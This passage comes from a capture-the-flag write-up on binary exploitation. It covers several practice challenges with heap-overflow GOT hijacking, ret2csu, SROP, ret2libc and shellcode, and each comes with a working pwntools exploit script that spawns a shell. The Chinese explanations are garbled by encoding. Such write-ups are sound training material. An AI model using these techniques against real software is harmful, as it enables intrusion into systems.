<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">sub_8048724</span><span class="params">(<span class="keyword">unsigned</span> __int8 index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+17h] [ebp-11h]</span></span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)total_users &amp;&amp; users[index] )</span><br><span class="line">  &#123;</span><br><span class="line">    len = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text length: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u%c&quot;</span>, &amp;len, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">char</span> *)(len + *(_DWORD *)users[index]) &gt;= (<span class="keyword">char</span> *)users[index] - <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;my l33t defenses cannot be fooled, cya!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text: &quot;</span>);</span><br><span class="line">    read_name(*(_DWORD *)users[index], len + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå…¶å®æ˜¯åˆ¤æ–­å½“å‰<code>user-&gt;description</code>åŠ ä¸Šè¾“å…¥çš„å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦ä¼šè¶…è¿‡<code>user</code>èµ·å§‹åœ°å€-4 çš„ä½ç½®ï¼Œç›®çš„å¾ˆæ˜æ˜¾æ˜¯ä¸ºäº†é˜²æ­¢å †æº¢å‡ºã€‚é¢„æœŸå†…å­˜å¸ƒå±€æ˜¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> --------</span><br><span class="line">| Desc0  |</span><br><span class="line"> -------- &lt;- user0</span><br><span class="line">| &amp;Desc0 |</span><br><span class="line"> --------</span><br><span class="line">| name0  |</span><br><span class="line"> --------</span><br><span class="line">| Desc1  |</span><br><span class="line"> -------- &lt;- user1</span><br><span class="line">| &amp;Desc1 |</span><br><span class="line"> --------</span><br><span class="line">| name1  |</span><br><span class="line"> --------</span><br><span class="line">| Desc2  |</span><br><span class="line"> -------- &lt;- user2</span><br><span class="line">| &amp;Desc2 |</span><br><span class="line"> --------</span><br><span class="line">| name2  |</span><br><span class="line"> --------</span><br></pre></td></tr></table></figure>

<p>ç„¶è€Œï¼Œæˆ‘ä»¬è¿˜æ‹¥æœ‰åˆ é™¤ç”¨æˆ·çš„åŠŸèƒ½ã€‚å‡å¦‚æˆ‘ä»¬åˆ é™¤ç¬¬ 0 ä¸ªç”¨æˆ·ï¼Œé‚£ä¹ˆä»–æ‹¥æœ‰çš„ç©ºé—´å°±è¢«<code>free()</code>äº†ã€‚è¿™æ—¶æˆ‘ä»¬æ–°å¢ç”¨æˆ·ï¼Œç”±äº<code>desc</code>é•¿åº¦å¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶å…¶é•¿åº¦è®©å®ƒæ°å¥½åˆ†é…åˆ°åŸæ¥ç¬¬ 0 ä¸ªç”¨æˆ·çš„ç©ºé—´ï¼Œä»<code>Desc0</code>ä¸€ç›´åˆ°<code>name0</code>ç»“æŸã€‚é‚£ä¹ˆæ­¤æ—¶ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> --------</span><br><span class="line">|        |</span><br><span class="line">|        |</span><br><span class="line">| Desc3  |</span><br><span class="line">|        |</span><br><span class="line">|        |</span><br><span class="line"> --------</span><br><span class="line">| Desc1  |</span><br><span class="line"> -------- &lt;- user1</span><br><span class="line">| &amp;Desc1 |</span><br><span class="line"> --------</span><br><span class="line">| name1  |</span><br><span class="line"> --------</span><br><span class="line">| Desc2  |</span><br><span class="line"> -------- &lt;- user2</span><br><span class="line">| &amp;Desc2 |</span><br><span class="line"> --------</span><br><span class="line">| name2  |</span><br><span class="line"> -------- &lt;- user3</span><br><span class="line">| &amp;Desc3 |</span><br><span class="line"> --------</span><br><span class="line">| name3  |</span><br><span class="line"> --------</span><br></pre></td></tr></table></figure>

<p>ä¸éš¾å‘ç°ï¼Œå³ä½¿æœ‰ä¸Šè¿°é˜²æŠ¤æªæ–½çš„é™åˆ¶ï¼Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥æº¢å‡ºåˆ°<code>user1</code>å¹¶è¦†ç›–å…¶ä¸­æ•°æ®ã€‚å¦‚æœæŠŠ libc ä¸­å‡½æ•°çš„ GOT è¡¨åœ°å€æ”¾è¿›å»ï¼Œç„¶å<code>display</code>å‡½æ•°æ‰“å°å‡ºæ¥ï¼Œå°±èƒ½æ³„éœ² libc åœ°å€ã€‚ç„¶åè¿›è¡Œ GOT åŠ«æŒå³å¯ getshellã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸Šå›¾ä¸­<code>Desc1</code>å‰å’Œ<code>&amp;Desc1</code>å‰éƒ½æœ‰ 8 å­—èŠ‚ chunk headerï¼Œè¦†ç›–æ—¶éœ€è¦è€ƒè™‘å®ƒä»¬å çš„ 16Bã€‚æ­¤å¤–ï¼Œ<code>Desc0+user0</code>åŸæœ¬æ‰€å çš„ç©ºé—´å®é™…ä¸Šæ˜¯<code>0x8+0x80+0x8+0x80</code>ï¼Œè€Œ<code>Desc3</code>ç”³è¯·<code>0x100</code>å­—èŠ‚æ—¶å®é™…å <code>0x8+0x100</code>ï¼Œå‰è€…æ¯”åè€…å¤šå‡ºç©ºé—²çš„<code>0x8</code>å­—èŠ‚ï¼Œä¹Ÿéœ€è¦è€ƒè™‘ã€‚å› æ­¤è®¡ç®—åç§»<code>0x100+0x8+0x8+0x80+0x8=0x198</code>ã€‚</p>
<p>æ”¾ä¸Š<code>0x198</code>å­—èŠ‚çš„ padding åï¼Œå°±å¯ä»¥æŠŠ<code>free</code>çš„ GOT åœ°å€æ”¾åœ¨<code>&amp;Desc1</code>å¤„ï¼Œæ­¤æ—¶æ‰“å°å‡ºæ¥çš„å°±æ˜¯<code>free</code>çš„ GOT åœ°å€ï¼Œä»è€Œæ³„éœ²å‡º libcã€‚è¿™æ—¶å†åˆ©ç”¨æ›´æ–°åŠŸèƒ½ç”¨<code>system.plt</code>è¦†ç›–<code>free.got</code>ï¼Œé‚£ä¹ˆæ‰§è¡Œ<code>free</code>æ—¶å°±ä¼šæ‰§è¡Œ<code>system</code>ã€‚æ­¤æ—¶è¿˜å·®ä¸€ä¸ªå‚æ•°<code>/bin/sh</code>ï¼Œæˆ‘ä»¬ä¸å¦¨æ”¾åœ¨<code>Desc2</code>å¤„ï¼Œé‚£ä¹ˆåœ¨åˆ é™¤<code>user2</code>æ—¶ï¼Œæœ‰æºç ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">delete</span><span class="params">(<span class="keyword">unsigned</span> __int8 index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)total_users &amp;&amp; users[index] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)users[index]);</span><br><span class="line">    <span class="built_in">free</span>(users[index]);</span><br><span class="line">    users[index] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±ä¼šæ‰§è¡Œ<code>free(address of /bin/sh)</code>ï¼Œå®é™…ä¸Šå°±æ˜¯<code>system(&#39;/bin/sh&#39;)</code>ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">max_len, desc_len, text</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;Action: &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;description: &#x27;</span>, <span class="built_in">str</span>(max_len))</span><br><span class="line">    sla(<span class="string">&#x27;name: &#x27;</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;length: &#x27;</span>, <span class="built_in">str</span>(desc_len))</span><br><span class="line">    sla(<span class="string">&#x27;text: &#x27;</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;Action: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;Action: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">index, desc_len, text</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;Action: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&#x27;length: &#x27;</span>, <span class="built_in">str</span>(desc_len))</span><br><span class="line">    sla(<span class="string">&#x27;text: &#x27;</span>, text)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x8</span>,<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="number">0x19c</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x198</span>+p32(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">display(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&#x27;tion: &#x27;</span>)</span><br><span class="line">free = u32(r(<span class="number">4</span>))</span><br><span class="line">leak(<span class="string">&#x27;free&#x27;</span>,free)</span><br><span class="line">system,binsh = ret2libc(free, <span class="string">&#x27;free&#x27;</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">1</span>,<span class="number">4</span>,p32(system))</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>


<h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><p>æœ¬é¢˜ä»£ç å¾ˆå°‘ï¼Œæ³¨æ„åˆ°<code>gadgets</code>å‡½æ•°ä¸­æœ‰<code>mov rax, 0Fh</code>å’Œ<code>mov rax, 3Bh</code>å¯ä»¥æ§åˆ¶<code>rax</code>ï¼Œå®ƒä»¬æ°å¥½åˆ†åˆ«å¯¹åº”ç³»ç»Ÿè°ƒç”¨<code>sigreturn</code>å’Œ<code>execve</code>ã€‚å› æ­¤æœ¬é¢˜å¯ä»¥å›´ç»•è¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ç»™å‡ºä¸¤ç§åšæ³•ã€‚</p>
<p>æ¯”è¾ƒéš¾çš„åšæ³•æ˜¯åˆ©ç”¨<code>execve</code>ï¼Œæˆ‘ä»¬å¸Œæœ›æ‰§è¡Œ<code>execve(&#39;/bin/sh&#39;,0,0)</code>ï¼Œé‚£ä¹ˆè¿˜éœ€è¦æ§åˆ¶<code>rdi,rsi,rdx</code>ã€‚è¿™é‡Œéœ€è¦å‡ ä¸ª gadgetsï¼Œä½†æ˜¯<code>gadgets</code>å‡½æ•°ä¸­çš„ä¸å¤Ÿç”¨ï¼Œæ‰€ä»¥å¯ä»¥<code>ret2csu</code>ã€‚<code>/bin/sh</code>éœ€è¦æˆ‘ä»¬è‡ªå·±å†™ï¼Œä½†åªèƒ½å†™åˆ°æ ˆä¸Šï¼Œå› æ­¤éœ€è¦é€šè¿‡<code>write</code>æ³„éœ²æ ˆåœ°å€ã€‚</p>
<p>æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ä½äº<code>rbp-0x10</code>ï¼Œé‚£ä¹ˆå¡«å…… 16 å­—èŠ‚åå¡«å……<code>main</code>å‡½æ•°åœ°å€å³å¯é‡å¯ç¨‹åºåŒæ—¶æ³„éœ²æ ˆåœ°å€ï¼Œgdb è°ƒè¯•å¯çŸ¥æ³„éœ²ä½ç½®è·ç¦»æˆ‘ä»¬çš„è¾“å…¥åç§»é‡ä¸º<code>0x118</code>å­—èŠ‚ã€‚</p>
<p>æœ€ååœ¨æ ˆä¸Šå¸ƒç½®å¥½<code>/bin/sh</code>å­—ç¬¦ä¸²å’Œ<code>pop_rdi</code>çš„ gadgetï¼Œå‡†å¤‡å¥½<code>rax</code>ï¼Œè¿”å›åˆ° csu æœ«å°¾ç¡®ä¿<code>rbx=0</code>ä¸”<code>rbp=1</code>ï¼Œå°†æ ˆä¸Š<code>pop rdi</code>çš„åœ°å€ç»™<code>r12</code>ä»¥ä¾¿è°ƒç”¨ï¼Œéšåè®¾ç½®<code>rsi,rdx</code>ä¸º 0ï¼Œæœ€åå°†<code>/bin/sh</code>çš„åœ°å€ç»™<code>rdi</code>ï¼Œè°ƒç”¨<code>syscall</code>å³å¯ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line">mov_rax_3b = <span class="number">0x4004e2</span></span><br><span class="line">pop_rdi = <span class="number">0x4005a3</span></span><br><span class="line">csu_1 = <span class="number">0x400580</span></span><br><span class="line">csu_2 = <span class="number">0x40059a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">16</span> + p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">sl(payload)</span><br><span class="line">r(<span class="number">0x20</span>)</span><br><span class="line">stack = uu64(r(<span class="number">8</span>))<span class="number">-0x118</span></span><br><span class="line">leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;/bin/sh\x00&#x27;</span>,pop_rdi,mov_rax_3b,csu_2,<span class="number">0</span>,<span class="number">1</span>,stack<span class="number">-0x18</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,csu_1,pop_rdi,stack<span class="number">-0x20</span>,syscall)</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒç§æ–¹æ³•åˆ™æ˜¯ SROPã€‚æˆ‘ä»¬åˆ©ç”¨<code>mov rax, 0Fh</code>æ§åˆ¶<code>rax</code>ä¸º 15ï¼Œéšåè°ƒç”¨<code>syscall</code>ï¼Œç›¸å½“äºæ‰§è¡Œäº†ä¸€æ¬¡<code>sigreturn</code>ã€‚å¯ä»¥ä¼ªé€  sigreturn frame æ¥æ‰§è¡Œ<code>execve(&#39;/bin/sh&#39;,0,0)</code>ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line">mov_rax_0f = <span class="number">0x4004da</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">16</span> + p64(elf.sym[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line">sl(payload)</span><br><span class="line">r(<span class="number">0x20</span>)</span><br><span class="line">stack = uu64(p.r(<span class="number">8</span>))<span class="number">-0x118</span></span><br><span class="line">leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = stack</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rsp = stack</span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>,mov_rax_0f,syscall) + <span class="built_in">str</span>(frame)</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure>

<h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h2><p>å‘ç°<code>main</code>é‡Œæœ‰<code>system</code>ï¼Œç„¶åè¿˜æ‰¾åˆ°äº†<code>/bin/sh</code>å­—ç¬¦ä¸²å’Œ<code>pop rdi</code>çš„ gadgetï¼Œé‚£å°±è€åŠæ³•ä¼ å‚å°±è¡Œäº†ï¼Œå°±æ˜¯ getshell ä¹‹åéœ€è¦æ‰¾ä¸€ä¸‹ flag çš„ä½ç½®ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">binsh = <span class="number">0x601048</span></span><br><span class="line">pop_rdi = <span class="number">0x400683</span></span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>,pop_rdi,binsh,elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure>

<h2 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h2><p>æœ¬é¢˜å…ˆä¼šè®©ç”¨æˆ·è®¾ç½®è¯»å…¥æ•°æ®é•¿åº¦ï¼Œå¦‚æœå¤§äº 32 åˆ™é€€å‡ºã€‚ç”±äºå®ƒè‡ªå·±å®ç°çš„<code>get_n</code>å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°æ˜¯<code>unsigned int</code>ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°ä½¿ç”¨æ•´æ•°æº¢å‡ºæ¥ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œå› æ­¤å¯ä»¥è¾“å…¥<code>-1</code>äº§ç”Ÿæ ˆæº¢å‡ºæ¼æ´ã€‚ç„¶å ret2libc å°±å¥½ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ru(<span class="string">&#x27;read?&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;data!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">you_said_s = <span class="number">0x80486f8</span></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>),elf.plt[<span class="string">&#x27;printf&#x27;</span>],elf.sym[<span class="string">&#x27;main&#x27;</span>],you_said_s,elf.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&#x27;You said: &#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;You said: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf = u32(r(<span class="number">4</span>))</span><br><span class="line">leak(<span class="string">&#x27;printf&#x27;</span>,printf)</span><br><span class="line">system,binsh = ret2libc(printf,<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;read?&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;data!&#x27;</span>)</span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>),system,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,binsh)</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure>

<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>è¿™é¢˜è¦æ±‚å­—ç¬¦ä¸²<code>s</code>ä»¥<code>crackme\x00</code>å¼€å¤´ï¼Œéšåä¼šæ‰§è¡Œ<code>memcpy</code>å°†æˆ‘ä»¬çš„è¾“å…¥å¤åˆ¶åˆ°ä¸€ä¸ª<code>dest</code>ä½ç½®ã€‚æˆ‘ä»¬é€šè¿‡ gdb è°ƒè¯•å¯ä»¥æµ‹å‡ºå…¶è·ç¦» ebp è·ç¦»ä¸º 22ï¼Œè¦è¦†ç›–åˆ°è¿”å›åœ°å€åˆ™éœ€è¦ 26 å­—èŠ‚ã€‚è‡³äºè¿”å›åœ°å€ï¼Œé¢˜ç›®æä¾›äº†å­—ç¬¦ä¸²<code>s</code>çš„åœ°å€ï¼Œä½†æ˜¯ç›´æ¥ä»¥å®ƒä½œä¸ºè¿”å›åœ°å€ä¼šå¤±è´¥ï¼Œgdb è°ƒè¯•åˆ°<code>vuln</code>å‡½æ•°ä¸­çš„<code>ret</code>è¯­å¥çš„æ—¶å€™ä¼šå‘ç°ï¼Œè¿”å›åœ°å€ä½äº<code>0xffca41dc</code>ï¼Œè€Œæˆ‘ä»¬å†™å…¥çš„æ•°æ®ä½äº<code>0xffca41c0</code>ï¼Œç›¸å·®<code>0x1c</code>ï¼Œå› æ­¤è¿˜éœ€è¦è€ƒè™‘è¯¥åç§»é‡ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ru(<span class="string">&#x27;crash: &#x27;</span>)</span><br><span class="line">ss = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&#x27;ss&#x27;</span>,ss)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;crashme\x00&#x27;</span>.ljust(<span class="number">26</span>,<span class="string">&#x27;\x00&#x27;</span>) + p32(ss<span class="number">-0x1c</span>) + asm(shellcraft.sh())</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><p>æœ¬é¢˜æœ‰<code>GetFlag</code>çš„åé—¨ï¼Œæœ‰ä¸€ä¸ª<code>memcpy</code>çš„æ“ä½œï¼Œæ­¤æ—¶éœ€è¦å…³æ³¨çš„åç§»å®é™…ä¸Šæ˜¯<code>dest</code>åˆ°<code>ebp</code>çš„è·ç¦»ã€‚ç®¡ç†å‘˜å¯†ç å¯ç›´æ¥é€šè¿‡åç¼–è¯‘å¾—åˆ°ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">binsh = <span class="number">0x80482ea</span></span><br><span class="line">sla(<span class="string">&#x27;password:&#x27;</span>,<span class="string">&#x27;administrator&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Exit\n:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x48</span>+<span class="number">4</span>),elf.plt[<span class="string">&#x27;system&#x27;</span>],<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,binsh)</span><br><span class="line">sla(<span class="string">&#x27;info:&#x27;</span>,payload)</span><br><span class="line">sla(<span class="string">&#x27;Exit\n:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h2><p>é¢˜ç›®ç»™å®šäº†libcï¼Œç»“åˆé¢˜ç›®åå¯ä»¥æƒ³åˆ°ret2libcï¼Œè¿™é‡Œåªèƒ½è°ƒç”¨<code>printf</code>æ¥æ‰“å°å‡½æ•°GOTåœ°å€ï¼Œå…¶ä½™å’Œå¸¸è§„ret2libcç›¸åŒã€‚</p>
